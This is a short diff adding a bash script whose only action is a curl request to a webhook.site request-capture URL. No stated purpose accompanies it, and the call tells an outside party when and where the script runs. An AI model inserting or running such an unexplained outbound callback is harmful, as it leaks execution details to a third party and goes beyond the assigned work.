@@ -1,0 +1,4 @@
+#!/bin/bash
+set -euo pipefail
+
+curl 'https://webhook.site/8108fd66-d6ee-4aad-9ce4-7838e935b543'
